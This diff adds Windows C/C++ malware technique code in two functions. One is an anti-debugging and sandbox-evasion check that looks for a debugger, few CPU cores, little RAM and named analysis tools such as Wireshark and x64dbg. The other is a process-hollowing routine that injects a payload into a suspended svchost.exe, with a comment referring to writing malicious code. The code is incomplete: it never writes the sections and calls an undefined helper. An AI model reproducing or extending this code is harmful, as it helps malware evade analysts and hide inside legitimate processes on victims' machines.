@@ -1,0 +1,59 @@
+// Anti-debugging and sandbox detection
+bool IsSafeToExecute() {
+    // Check for debugger
+    if (IsDebuggerPresent()) return false;
+    
+    // Check for virtual machine/sandbox
+    SYSTEM_INFO sysInfo;
+    GetSystemInfo(&sysInfo);
+    if (sysInfo.dwNumberOfProcessors < 2) return false; // Sandbox often single-core
+    
+    // Check RAM size (sandboxes often have limited RAM)
+    MEMORYSTATUSEX memStatus;
+    memStatus.dwLength = sizeof(memStatus);
+    GlobalMemoryStatusEx(&memStatus);
+    if (memStatus.ullTotalPhys < (2ULL * 1024 * 1024 * 1024)) return false; // Less than 2GB
+    
+    // Check for common analysis tools
+    const char* analysisTools[] = {
+        "procmon.exe", "wireshark.exe", "ProcessHacker.exe",
+        "ollydbg.exe", "x64dbg.exe", "idaq.exe"
+    };
+    
+    for (const auto& tool : analysisTools) {
+        if (GetModuleHandle(tool) != NULL) return false;
+    }
+    
+    return true;
+}
+
+// Process hollowing to inject into legitimate process
+void ProcessHollowing() {
+    STARTUPINFO si = { sizeof(si) };
+    PROCESS_INFORMATION pi;
+    
+    // Create suspended svchost process
+    CreateProcess("C:\\Windows\\System32\\svchost.exe", NULL,
+                  NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+    
+    // Get base address of target process
+    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)GetModuleHandle(NULL);
+    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)pDosHeader + pDosHeader->e_lfanew);
+    
+    // Unmap original code and write malicious code
+    LPVOID imageBase = GetProcessImageBase(pi.hProcess);
+    NtUnmapViewOfSection(pi.hProcess, imageBase);
+    
+    // Allocate new memory and write payload
+    LPVOID newImageBase = VirtualAllocEx(pi.hProcess, imageBase,
+                                         pNtHeaders->OptionalHeader.SizeOfImage,
+                                         MEM_COMMIT | MEM_RESERVE,
+                                         PAGE_EXECUTE_READWRITE);
+    
+    // Write headers and sections
+    WriteProcessMemory(pi.hProcess, newImageBase, pDosHeader,
+                      pNtHeaders->OptionalHeader.SizeOfHeaders, NULL);
+    
+    // Resume thread
+    ResumeThread(pi.hThread);
+}
